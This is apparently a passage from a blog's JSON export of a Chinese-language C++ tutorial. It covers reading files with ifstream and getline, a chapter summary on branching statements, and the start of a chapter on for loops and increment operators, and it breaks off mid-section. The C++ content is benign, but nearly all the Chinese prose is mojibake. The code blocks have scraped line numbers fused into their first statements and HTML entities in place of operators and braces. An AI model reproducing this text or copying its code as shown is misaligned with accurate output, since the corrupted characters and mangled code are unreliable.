æ¥è¯»å–æ•´è¡Œã€‚è¯»å–æ“ä½œé€šå¸¸æ”¾åœ¨å¾ªç¯ä¸­ï¼Œç›´åˆ°åˆ°è¾¾æ–‡ä»¶æœ«å°¾ã€‚ ä½¿ç”¨ &gt;&gt; è¯»å–: å®ƒä¼šè·³è¿‡å‰å¯¼ç©ºç™½ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ï¼Œç„¶åè¯»å–ç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªç©ºç™½å­—ç¬¦ã€‚ ä½¿ç”¨ std::getline(inputFile, lineString) è¯»å–: å®ƒä¼šè¯»å–æ•´è¡Œï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ \\n ä¸ºæ­¢ï¼ˆæ¢è¡Œç¬¦æœ¬èº«ä¼šè¢«è¯»å–å¹¶ä¸¢å¼ƒï¼‰ã€‚ æ£€æŸ¥æ–‡ä»¶æœ«å°¾ (EOF): å½“å°è¯•è¯»å–ä½†å·²æ— æ•°æ®å¯è¯»æ—¶ï¼ˆåˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰ï¼Œè¾“å…¥æµä¼šè¿›å…¥ç‰¹æ®ŠçŠ¶æ€ã€‚å¾ªç¯é€šå¸¸ä¾èµ–äºæ£€æŸ¥æµçš„çŠ¶æ€æ¥ç»ˆæ­¢ã€‚ while (inputFile &gt;&gt; variable): å½“ &gt;&gt; æˆåŠŸè¯»å–æ—¶ï¼ŒæµçŠ¶æ€ä¸º trueï¼Œå¾ªç¯ç»§ç»­ï¼›åˆ°è¾¾æ–‡ä»¶æœ«å°¾æˆ–é‡åˆ°æ— æ•ˆæ•°æ®æ—¶ï¼ŒçŠ¶æ€å˜ä¸º falseï¼Œå¾ªç¯ç»ˆæ­¢ã€‚ while (std::getline(inputFile, lineString)): å½“ getline æˆåŠŸè¯»å–ä¸€è¡Œæ—¶ï¼ŒæµçŠ¶æ€ä¸º trueï¼›åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶ï¼ŒçŠ¶æ€å˜ä¸º falseã€‚ å…³é—­æ–‡ä»¶: è¯»å–å®Œæˆåï¼Œå…³é—­æ–‡ä»¶ã€‚åŒæ ·ï¼Œå¯ä»¥æ˜¾å¼è°ƒç”¨ close()ï¼Œæˆ–è€…ä¾èµ–å¯¹è±¡çš„ææ„å‡½æ•°ã€‚ 1inputFile.close(); ç¤ºä¾‹ä»£ç  (è¯»å– report.txt): 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;#include &lt;vector&gt; // ç”¨äºå­˜å‚¨è¯»å–çš„è¡Œint main() &#123; // 1. åˆ›å»º ifstream å¯¹è±¡å¹¶å…³è”æ–‡ä»¶ std::ifstream inFile(&quot;report.txt&quot;); // 2. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ if (!inFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not open report.txt for reading.&quot; &lt;&lt; std::endl; return 1; &#125; std::cout &lt;&lt; &quot;Reading data from report.txt using getline:&quot; &lt;&lt; std::endl; std::string line; std::vector&lt;std::string&gt; lines; // 3. ä½¿ç”¨ getline é€è¡Œè¯»å– while (std::getline(inFile, line)) &#123; std::cout &lt;&lt; &quot;Read line: &quot; &lt;&lt; line &lt;&lt; std::endl; lines.push_back(line); // å°†è¯»å–çš„è¡Œå­˜å…¥ vector &#125; // æ£€æŸ¥å¾ªç¯æ˜¯å› ä¸ºåˆ°è¾¾æ–‡ä»¶æœ«å°¾è¿˜æ˜¯å‘ç”Ÿé”™è¯¯ if (inFile.eof()) &#123; std::cout &lt;&lt; &quot;\\nReached end of file.&quot; &lt;&lt; std::endl; &#125; else if (inFile.fail()) &#123; std::cerr &lt;&lt; &quot;\\nError reading file (not EOF).&quot; &lt;&lt; std::endl; &#125; // 4. å…³é—­æ–‡ä»¶ inFile.close(); std::cout &lt;&lt; &quot;\\n--- Stored Lines ---&quot; &lt;&lt; std::endl; for(const std::string&amp; stored_line : lines) &#123; std::cout &lt;&lt; stored_line &lt;&lt; std::endl; &#125; // ç¤ºä¾‹ï¼šä½¿ç”¨ &gt;&gt; è¯»å–ç‰¹å®šç±»å‹çš„æ•°æ® (å‡è®¾æ–‡ä»¶æ ¼å¼å·²çŸ¥) std::ifstream dataFile(&quot;report.txt&quot;); // é‡æ–°æ‰“å¼€æ–‡ä»¶ if (!dataFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not reopen report.txt&quot; &lt;&lt; std::endl; return 1; &#125; std::cout &lt;&lt; &quot;\\nReading specific data using &gt;&gt; (may be fragile):&quot; &lt;&lt; std::endl; std::string header, productLabel, productName, qtyLabel; int quantity; double revenue; // è·³è¿‡ç¬¬ä¸€è¡Œ std::getline(dataFile, header); // è¯»å–ç¬¬äºŒè¡Œçš„æ•°æ® dataFile &gt;&gt; productLabel &gt;&gt; productName; // è¯»å–ç¬¬ä¸‰è¡Œçš„æ•°æ® dataFile &gt;&gt; qtyLabel &gt;&gt; quantity; // è·³è¿‡ç¬¬å››è¡Œçš„ Revenue: æ ‡ç­¾ std::string revenueLabel; dataFile &gt;&gt; revenueLabel &gt;&gt; revenue; if (dataFile) &#123; // æ£€æŸ¥è¯»å–æ˜¯å¦æˆåŠŸ std::cout &lt;&lt; &quot;Product: &quot; &lt;&lt; productName &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Quantity: &quot; &lt;&lt; quantity &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Revenue: &quot; &lt;&lt; revenue &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to parse data using &gt;&gt;&quot; &lt;&lt; std::endl; &#125; dataFile.close(); return 0;&#125; ä»£ç è§£é‡Š: ç¬¬ä¸€ä¸ªå¾ªç¯ä½¿ç”¨ std::getline() è¯»å–æ–‡ä»¶çš„æ¯ä¸€è¡Œï¼Œå¹¶å°†å…¶æ‰“å°å‡ºæ¥ï¼ŒåŒæ—¶å­˜å‚¨åœ¨ lines å‘é‡ä¸­ã€‚while (std::getline(inFile, line)) æ˜¯è¯»å–æ–‡æœ¬æ–‡ä»¶çš„å¸¸ç”¨æ¨¡å¼ã€‚ å¾ªç¯ç»“æŸåï¼Œé€šè¿‡æ£€æŸ¥ inFile.eof() å’Œ inFile.fail() å¯ä»¥åˆ¤æ–­å¾ªç¯æ˜¯æ­£å¸¸ç»“æŸï¼ˆåˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰è¿˜æ˜¯å› ä¸ºå…¶ä»–é”™è¯¯ã€‚ ç¬¬äºŒä¸ªç¤ºä¾‹æ¼”ç¤ºäº†ä½¿ç”¨ &gt;&gt; æ“ä½œç¬¦è¯»å–ç‰¹å®šæ ¼å¼çš„æ•°æ®ã€‚è¿™ç§æ–¹æ³•å¯¹äºæ ¼å¼ä¸¥æ ¼å›ºå®šçš„æ–‡ä»¶å¯èƒ½æœ‰æ•ˆï¼Œä½†å¦‚æœæ–‡ä»¶æ ¼å¼ç¨æœ‰å˜åŒ–ï¼ˆä¾‹å¦‚å¤šäº†ç©ºæ ¼ï¼‰ï¼Œ&gt;&gt; å°±å¯èƒ½è¯»å–å¤±è´¥æˆ–è¯»åˆ°é”™è¯¯çš„æ•°æ®ï¼Œå› æ­¤é€šå¸¸ä¸å¦‚ getline å¥å£®ã€‚éœ€è¦ä»”ç»†å¤„ç†æ ‡ç­¾å’Œæ•°æ®ç±»å‹ã€‚ æ–‡ä»¶ I/O æ˜¯ C++ ç¼–ç¨‹ä¸­éå¸¸é‡è¦çš„éƒ¨åˆ†ï¼Œå®ƒä½¿å¾—ç¨‹åºèƒ½å¤ŸæŒä¹…åŒ–æ•°æ®ï¼Œå¹¶ä¸å…¶ä»–ç¨‹åºæˆ–ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚ 6.9 æ€»ç»“æœ¬ç« ä»‹ç»äº† C++ ä¸­ç”¨äºæ§åˆ¶ç¨‹åºæµç¨‹çš„å„ç§åˆ†æ”¯è¯­å¥å’Œç›¸å…³æ¦‚å¿µï¼Œä½¿å¾—ç¨‹åºèƒ½å¤Ÿæ ¹æ®ä¸åŒçš„æ¡ä»¶æ‰§è¡Œä¸åŒçš„ä»£ç è·¯å¾„ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š if è¯­å¥ç³»åˆ—: if è¯­å¥ï¼šæ ¹æ®æ¡ä»¶æ˜¯å¦ä¸ºçœŸæ¥å†³å®šæ˜¯å¦æ‰§è¡ŒæŸæ®µä»£ç ã€‚ if else è¯­å¥ï¼šæä¾›ä¸¤ä¸ªä»£ç è·¯å¾„ï¼Œæ ¹æ®æ¡ä»¶ä¸ºçœŸæˆ–å‡é€‰æ‹©å…¶ä¸€æ‰§è¡Œã€‚ if else if else ç»“æ„ï¼šç”¨äºå¤„ç†å¤šä¸ªäº’æ–¥çš„æ¡ä»¶ï¼Œæä¾›å¤šè·¯åˆ†æ”¯é€‰æ‹©ã€‚ é€»è¾‘è¿ç®—ç¬¦: || (é€»è¾‘æˆ–)ï¼šä¸¤ä¸ªæ“ä½œæ•°ä¸­è‡³å°‘ä¸€ä¸ªä¸ºçœŸæ—¶ï¼Œç»“æœä¸ºçœŸã€‚ &amp;&amp; (é€»è¾‘ä¸)ï¼šä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸ºçœŸæ—¶ï¼Œç»“æœæ‰ä¸ºçœŸã€‚å…·æœ‰çŸ­è·¯æ±‚å€¼ç‰¹æ€§ã€‚ ! (é€»è¾‘é)ï¼šåè½¬æ“ä½œæ•°çš„é€»è¾‘çŠ¶æ€ï¼ˆçœŸå˜å‡ï¼Œå‡å˜çœŸï¼‰ã€‚ cctype åº“: æä¾›äº†ä¸€ç³»åˆ—ç”¨äºå¤„ç†å­—ç¬¦çš„å‡½æ•°ï¼Œå¦‚ isalpha(), isdigit(), isspace(), ispunct(), toupper(), tolower() ç­‰ï¼Œæ–¹ä¾¿è¿›è¡Œå­—ç¬¦åˆ†ç±»å’Œè½¬æ¢ã€‚ ä¸‰å…ƒè¿ç®—ç¬¦ (?:): æä¾›äº†ä¸€ç§ç®€æ´çš„æ–¹å¼æ¥æ ¹æ®æ¡ä»¶é€‰æ‹©ä¸¤ä¸ªå€¼ä¸­çš„ä¸€ä¸ªï¼Œæ˜¯ if else è¯­å¥çš„ä¸€ç§ç´§å‡‘æ›¿ä»£å½¢å¼ï¼Œå¸¸ç”¨äºç®€å•çš„èµ‹å€¼æ“ä½œã€‚ è¯­æ³•ï¼šcondition ? expression1 : expression2; switch è¯­å¥: æ ¹æ®ä¸€ä¸ªæ•´æ•°è¡¨è¾¾å¼çš„å€¼ï¼Œä»å¤šä¸ª case æ ‡ç­¾ä¸­é€‰æ‹©ä¸€ä¸ªåŒ¹é…çš„æ‰§è¡Œç‚¹ã€‚ é€šå¸¸ä¸ break è¯­å¥é…åˆä½¿ç”¨ï¼Œä»¥é˜²æ­¢â€œè´¯ç©¿â€åˆ°ä¸‹ä¸€ä¸ª caseã€‚ default æ ‡ç­¾å¤„ç†æ‰€æœ‰å…¶ä»–ä¸åŒ¹é…çš„æƒ…å†µã€‚ case æ ‡ç­¾å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼ã€‚ é€‚ç”¨äºåŸºäºå•ä¸ªç¦»æ•£æ•´æ•°å€¼çš„å¤šè·¯åˆ†æ”¯ã€‚ break å’Œ continue è¯­å¥: breakï¼šç«‹å³ç»ˆæ­¢æœ€å†…å±‚çš„å¾ªç¯ï¼ˆfor, while, do whileï¼‰æˆ– switch è¯­å¥ã€‚ continueï¼šè·³è¿‡å½“å‰å¾ªç¯è¿­ä»£çš„å‰©ä½™éƒ¨åˆ†ï¼Œç›´æ¥å¼€å§‹ä¸‹ä¸€æ¬¡è¿­ä»£ï¼ˆæ›´æ–°å’Œæ¡ä»¶æ£€æŸ¥ï¼‰ã€‚ è¯»å–æ•°å­—çš„å¾ªç¯: æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨å¾ªç¯ï¼ˆå¦‚ while (cin &gt;&gt; value)ï¼‰æ¥è¿ç»­è¯»å–æ•°å­—è¾“å…¥ã€‚ å¼ºè°ƒäº†å¤„ç†é”™è¯¯è¾“å…¥çš„é‡è¦æ€§ï¼ŒåŒ…æ‹¬ä½¿ç”¨ cin.clear() æ¸…é™¤é”™è¯¯çŠ¶æ€å’Œ cin.ignore() ä¸¢å¼ƒæ— æ•ˆè¾“å…¥ï¼Œä»¥ç¼–å†™æ›´å¥å£®çš„è¾“å…¥ä»£ç ã€‚ ç®€å•æ–‡ä»¶è¾“å…¥/è¾“å‡º: å¼•å…¥äº† &lt;fstream&gt; åº“ï¼Œç”¨äºæ–‡ä»¶æ“ä½œã€‚ ofstreamï¼šç”¨äºå‘æ–‡ä»¶å†™å…¥æ•°æ®ï¼ˆè¾“å‡ºæ–‡ä»¶æµï¼‰ï¼Œä½¿ç”¨ &lt;&lt; æ“ä½œç¬¦ã€‚ ifstreamï¼šç”¨äºä»æ–‡ä»¶è¯»å–æ•°æ®ï¼ˆè¾“å…¥æ–‡ä»¶æµï¼‰ï¼Œä½¿ç”¨ &gt;&gt; æˆ– getline()ã€‚ å¼ºè°ƒäº†æ–‡ä»¶æ‰“å¼€æ£€æŸ¥ (is_open()) å’Œå…³é—­æ–‡ä»¶ (close() æˆ–åˆ©ç”¨å¯¹è±¡ææ„) çš„é‡è¦æ€§ã€‚ åŒºåˆ†äº†æ–‡æœ¬ I/O å’ŒäºŒè¿›åˆ¶ I/O çš„åŸºæœ¬æ¦‚å¿µã€‚ é€šè¿‡æŒæ¡è¿™äº›åˆ†æ”¯ç»“æ„å’Œæ§åˆ¶è¯­å¥ï¼Œå¯ä»¥ç¼–å†™å‡ºèƒ½å¤Ÿå“åº”ä¸åŒæƒ…å†µã€å¤„ç†ç”¨æˆ·è¾“å…¥å’Œæ–‡ä»¶æ•°æ®çš„æ›´å¤æ‚ã€æ›´çµæ´»çš„ C++ ç¨‹åºã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 5 å¾ªç¯å’Œå…³ç³»è¡¨è¾¾å¼","slug":"Cpp_tutorial_Chapter_5","date":"2025-04-26T12:03:35.373Z","updated":"2025-04-26T12:01:40.288Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_5/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_5/","excerpt":"","text":"5.1 forå¾ªç¯å¾ªç¯æ˜¯ç¼–ç¨‹ä¸­çš„åŸºæœ¬æ§åˆ¶ç»“æ„ï¼Œå®ƒå…è®¸æˆ‘ä»¬é‡å¤æ‰§è¡Œä¸€æ®µä»£ç ï¼Œç›´åˆ°æ»¡è¶³æŸä¸ªæ¡ä»¶ä¸ºæ­¢ã€‚for å¾ªç¯æ˜¯ C++ ä¸­æœ€å¸¸ç”¨çš„å¾ªç¯ç»“æ„ä¹‹ä¸€ï¼Œç‰¹åˆ«é€‚ç”¨äºå·²çŸ¥å¾ªç¯æ¬¡æ•°æˆ–éœ€è¦æŒ‰ç‰¹å®šæ­¥é•¿è¿­ä»£çš„æƒ…å†µã€‚ 5.1.1 forå¾ªç¯çš„ç»„æˆéƒ¨åˆ†for å¾ªç¯çš„å¤´éƒ¨åŒ…å«ä¸‰ä¸ªç”±åˆ†å· ; åˆ†éš”çš„éƒ¨åˆ†ï¼Œæ§åˆ¶ç€å¾ªç¯çš„æ‰§è¡Œæµç¨‹ï¼š åˆå§‹åŒ– (Initialization): åœ¨å¾ªç¯å¼€å§‹å‰æ‰§è¡Œä¸€æ¬¡ã€‚ é€šå¸¸ç”¨äºå£°æ˜å’Œ/æˆ–åˆå§‹åŒ–å¾ªç¯æ§åˆ¶å˜é‡ï¼ˆè®¡æ•°å™¨ï¼‰ã€‚ å¯ä»¥åŒ…å«å¤šæ¡è¯­å¥ï¼Œç”¨é€—å·åˆ†éš”ï¼ˆè§ 5.1.11ï¼‰ã€‚ ä¹Ÿå¯ä»¥ä¸ºç©ºã€‚ æµ‹è¯•æ¡ä»¶ (Test Condition / Condition): åœ¨æ¯æ¬¡å¾ªç¯è¿­ä»£å¼€å§‹å‰è¿›è¡Œæ±‚å€¼ã€‚ ç»“æœå¿…é¡»æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ (true æˆ– false) æˆ–å¯ä»¥è½¬æ¢ä¸ºå¸ƒå°”å€¼ï¼ˆéé›¶ä¸º trueï¼Œé›¶ä¸º falseï¼‰ã€‚ å¦‚æœæ¡ä»¶ä¸º trueï¼Œåˆ™æ‰§è¡Œå¾ªç¯ä½“ã€‚ å¦‚æœæ¡ä»¶ä¸º falseï¼Œåˆ™å¾ªç¯ç»ˆæ­¢ï¼Œç¨‹åºç»§ç»­æ‰§è¡Œå¾ªç¯åé¢çš„è¯­å¥ã€‚ ä¹Ÿå¯ä»¥ä¸ºç©ºï¼Œç©ºæ¡ä»¶è¢«è§†ä¸º trueï¼Œå½¢æˆæ— é™å¾ªç¯ï¼ˆéœ€è¦å…¶ä»–æ–¹å¼è·³å‡ºï¼Œå¦‚ breakï¼‰ã€‚ æ›´æ–° (Update / Increment / Decrement): åœ¨æ¯æ¬¡å¾ªç¯è¿­ä»£ç»“æŸæ—¶ï¼ˆæ‰§è¡Œå®Œå¾ªç¯ä½“ä¹‹åï¼Œä¸‹æ¬¡æµ‹è¯•æ¡ä»¶ä¹‹å‰ï¼‰æ‰§è¡Œã€‚ é€šå¸¸ç”¨äºä¿®æ”¹å¾ªç¯æ§åˆ¶å˜é‡ï¼ˆä¾‹å¦‚ï¼Œé€’å¢æˆ–é€’å‡è®¡æ•°å™¨ï¼‰ã€‚ å¯ä»¥åŒ…å«å¤šæ¡è¯­å¥ï¼Œç”¨é€—å·åˆ†éš”ã€‚ ä¹Ÿå¯ä»¥ä¸ºç©ºã€‚ è¯­æ³•: 123456789for (initialization; test_condition; update) &#123; // å¾ªç¯ä½“ (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125; // æˆ–è€…å¦‚æœå¾ªç¯ä½“åªæœ‰ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥çœç•¥èŠ±æ‹¬å·for (initialization; test_condition; update) single_statement; æ‰§è¡Œæµç¨‹: æ‰§è¡Œ initializationã€‚ è®¡ç®— test_conditionã€‚ å¦‚æœ test_condition ä¸º falseï¼Œè·³å‡ºå¾ªç¯ï¼Œæ‰§è¡Œå¾ªç¯åé¢çš„ä»£ç ã€‚ å¦‚æœ test_condition ä¸º trueï¼Œæ‰§è¡Œå¾ªç¯ä½“ä¸­çš„è¯­å¥ã€‚ æ‰§è¡Œ updateã€‚ å›åˆ°æ­¥éª¤ 2ã€‚ ç¤ºä¾‹: 12345678910111213141516#include &lt;iostream&gt;int main() &#123; // æ‰“å°æ•°å­— 0 åˆ° 4 for (int i = 0; // 1. åˆå§‹åŒ–: å£°æ˜å¹¶åˆå§‹åŒ–è®¡æ•°å™¨ i ä¸º 0 i &lt; 5; // 2. æµ‹è¯•æ¡ä»¶: åªè¦ i å°äº 5 å°±ç»§ç»­ i = i + 1) // 4. æ›´æ–°: æ¯æ¬¡å¾ªç¯åå°† i å¢åŠ  1 &#123; // 3. å¾ªç¯ä½“ std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Loop finished.&quot; &lt;&lt; std::endl; return 0;&#125; 5.1.2 å›åˆ°forå¾ªç¯for å¾ªç¯æä¾›äº†ä¸€ç§éå¸¸ç»“æ„åŒ–çš„æ–¹å¼æ¥ç¼–å†™è®¡æ•°å¾ªç¯ã€‚ä¸Šé¢çš„ä¾‹å­å±•ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„ä» 0 å¼€å§‹è®¡æ•°åˆ°æŸä¸ªå€¼ä¹‹å‰çš„å¾ªç¯ã€‚ åŸºæœ¬è®¡æ•°å¾ªç¯ç¤ºä¾‹: 12345678910111213141516171819#include &lt;iostream&gt;int main() &#123; // è®¡ç®— 1 åˆ° 10 çš„å’Œ int sum = 0; for (int i = 1; i &lt;= 10; i = i + 1) &#123; // ä» 1 å¼€å§‹ï¼ŒåŒ…å« 10 sum = sum + i; &#125; std::cout &lt;&lt; &quot;Sum of 1 to 10 is: &quot; &lt;&lt; sum &lt;&lt; std::endl; // è¾“å‡º 55 // å€’åºæ‰“å° 5 åˆ° 1 std::cout &lt;&lt; &quot;Countdown:&quot; &lt;&lt; std::endl; for (int count = 5; count &gt; 0; count = count - 1) &#123; std::cout &lt;&lt; count &lt;&lt; &quot;...&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Liftoff!&quot; &lt;&lt; std::endl; return 0;&#125; 5.1.3 ä¿®æ”¹æ­¥é•¿for å¾ªç¯çš„æ›´æ–°éƒ¨åˆ†ä¸ä¸€å®šæ€»æ˜¯åŠ  1 æˆ–å‡ 1ã€‚ä½ å¯ä»¥æ ¹æ®éœ€è¦æŒ‡å®šä»»ä½•æœ‰æ•ˆçš„æ›´æ–°è¡¨è¾¾å¼ã€‚ ç¤ºä¾‹: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; // ä»¥æ­¥é•¿ 2 é€’å¢ï¼Œæ‰“å°å¶æ•° std::cout &lt;&lt; &quot;Even numbers less than 10:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 10; i = i + 2) &#123; std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º 0 2 4 6 8 // ä»¥æ­¥é•¿ 5 é€’å‡ std::cout &lt;&lt; &quot;Counting down by 5s:&quot; &lt;&lt; std::endl; for (int n = 50; n &gt;= 0; n = n - 5) &#123; std::cout &lt;&lt; n &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º 50 45 40 35 30 25 20 15 10 5 0 // ä½¿ç”¨ä¹˜æ³•ä½œä¸ºæ­¥é•¿ (æ³¨æ„é¿å…æ— é™å¾ªç¯) std::cout &lt;&lt; &quot;Powers of 2 less than 100:&quot; &lt;&lt; std::endl; for (int p = 1; p &lt; 100; p = p * 2) &#123; std::cout &lt;&lt; p &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º 1 2 4 8 16 32 64 return 0;&#125; 5.1.4 ä½¿ç”¨forå¾ªç¯è®¿é—®å­—ç¬¦ä¸²for å¾ªç¯æ˜¯éå†å­—ç¬¦ä¸²ï¼ˆæ— è®ºæ˜¯ C é£æ ¼å­—ç¬¦ä¸²è¿˜æ˜¯ std::string å¯¹è±¡ï¼‰ä¸­æ¯ä¸ªå­—ç¬¦çš„å¸¸ç”¨æ–¹æ³•ã€‚ ç¤ºä¾‹ (C é£æ ¼å­—ç¬¦ä¸²): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;cstring&gt; // ä¸ºäº† strlen()int main() &#123; char message[] = &quot;Hello&quot;; int len = strlen(message); // è·å–å­—ç¬¦ä¸²é•¿åº¦ (ä¸åŒ…æ‹¬ \\0) std::cout &lt;&lt; &quot;Characters in \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; len; i = i + 1) &#123; // ç´¢å¼•ä» 0 åˆ° len-1 std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; i &lt;&lt; &quot;: &quot; &lt;&lt; message[i] &lt;&lt; std::endl; &#125; // ä¹Ÿå¯ä»¥ä½¿ç”¨æŒ‡é’ˆå’Œç©ºå­—ç¬¦åˆ¤æ–­ std::cout &lt;&lt; &quot;Characters using pointer:&quot; &lt;&lt; std::endl; for (char *p = message; *p != &#x27;\\0&#x27;; p = p + 1) &#123; std::cout &lt;&lt; *p &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; ç¤ºä¾‹ (std::string): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string word = &quot;World&quot;; std::cout &lt;&lt; &quot;Characters in \\&quot;&quot; &lt;&lt; word &lt;&lt; &quot;\\&quot;:&quot; &lt;&lt; std::endl; // ä½¿ç”¨ size() è·å–é•¿åº¦ï¼Œsize_t é€šå¸¸æ˜¯åˆé€‚çš„ç´¢å¼•ç±»å‹ for (size_t i = 0; i &lt; word.size(); i = i + 1) &#123; std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; i &lt;&lt; &quot;: &quot; &lt;&lt; word[i] &lt;&lt; std::endl; &#125; // C++11 åŸºäºèŒƒå›´çš„ for å¾ªç¯ (æ›´ç®€æ´ï¼Œè§ 5.4) // std::cout &lt;&lt; &quot;Characters using range-based for:&quot; &lt;&lt; std::endl; // for (char ch : word) &#123; // std::cout &lt;&lt; ch &lt;&lt; &quot; &quot;; // &#125; // std::cout &lt;&lt; std::endl; return 0;&#125; 5.1.5 é€’å¢è¿ç®—ç¬¦ï¼ˆ++ï¼‰å’Œé€’å‡è¿ç®—ç¬¦ï¼ˆâ€“ï¼‰C++ æä¾›äº†ä¸¤ä¸ªéå¸¸æœ‰ç”¨çš„è¿ç®—ç¬¦æ¥ç®€åŒ–å˜é‡åŠ  1 æˆ–å‡ 1 çš„æ“ä½œï¼š é€’å¢è¿ç®—ç¬¦ (++): å°†æ“ä½œæ•°çš„å€¼å¢åŠ  1ã€‚ é€’å‡è¿ç®—ç¬¦ (--): å°†æ“ä½œæ•°çš„å€¼å‡å°‘ 1ã€‚ å®ƒä»¬å¯ä»¥ç”¨äºæ•´æ•°ç±»å‹ã€æµ®ç‚¹ç±»å‹å’ŒæŒ‡é’ˆç±»å‹ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int count = 5; double value = 10.5; // é€’å¢ count++; // ç­‰ä»·äº count = count + 1; ç°åœ¨ count æ˜¯ 6 ++value; // ç­‰ä»·äº value = value + 1; ç°åœ¨ value æ˜¯ 11.5 std::cout &lt;&lt; &quot;Count after increment: &quot; &lt;&lt; count &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value after increment: &quot; &lt;&lt; value &lt;&lt; std::endl; // é€’å‡ count--; // ç­‰ä»·äº count = count - 1; ç°åœ¨ count æ˜¯ 5 --value; // ç­‰ä»·äº value = value - 1; ç°åœ¨ value æ˜¯ 10.5 std::cout &lt;&lt; &quot;Count after decrement: &quot; &lt;&lt; count &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value after decrement: &quot; &lt;&lt; value &lt;&lt; std::endl; // åœ¨ for å¾ªç¯ä¸­ä½¿ç”¨ std::cout &lt;&lt; &quot;Loop using ++:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 3; ++i) &#123; // ä½¿ç”¨ ++i æˆ– i++ æ•ˆæœç›¸åŒ (ä½œä¸ºç‹¬ç«‹è¯­å¥) std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; std::endl; &#125; return 0;&#125; 5.1.6 å‰¯ä½œç”¨å’Œé¡ºåºç‚¹å‰¯ä½œç”¨ (Side Effect): æŒ‡çš„æ˜¯ä¿®æ”¹å˜é‡çš„å€¼æˆ–æ‰§è¡Œ I/O æ“ä½œç­‰æ”¹å˜ç¨‹åºçŠ¶æ€çš„è¡Œä¸ºã€‚é€’å¢ (++) å’Œé€’å‡ (--) è¿ç®—ç¬¦éƒ½å…·æœ‰å‰¯ä½œç”¨ï¼Œå› ä¸ºå®ƒä»¬ä¼šä¿®æ”¹æ“ä½œæ•°çš„å€¼ã€‚ é¡ºåºç‚¹ (Sequence Point): æ˜¯ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ—¶é—´ç‚¹ï¼Œåœ¨è¯¥ç‚¹ä¹‹å‰çš„æ‰€æœ‰å‰¯ä½œç”¨éƒ½å·²å®Œæˆï¼Œå¹¶ä¸”åç»­çš„å‰¯ä½œç”¨å°šæœªå‘ç”Ÿã€‚C++ æ ‡å‡†å®šä¹‰äº†ä¸€äº›é¡ºåºç‚¹ï¼Œä¾‹å¦‚ï¼š åˆ†å· ; (è¯­å¥ç»“æŸå¤„) å®Œæ•´è¡¨è¾¾å¼ç»“æŸæ—¶ï¼ˆå¦‚ if æ¡ä»¶ã€while æ¡ä»¶ã€for å¾ªç¯çš„ä¸‰ä¸ªéƒ¨åˆ†ä¹‹åï¼‰ å‡½æ•°è°ƒç”¨ä¹‹å‰ï¼ˆæ‰€æœ‰å‚æ•°çš„å‰¯ä½œç”¨å®Œæˆï¼‰ æŸäº›è¿ç®—ç¬¦ï¼ˆå¦‚ &amp;&amp;, ||, , é€—å·è¿ç®—ç¬¦ï¼‰çš„ç‰¹å®šä½ç½® é‡è¦æ€§: 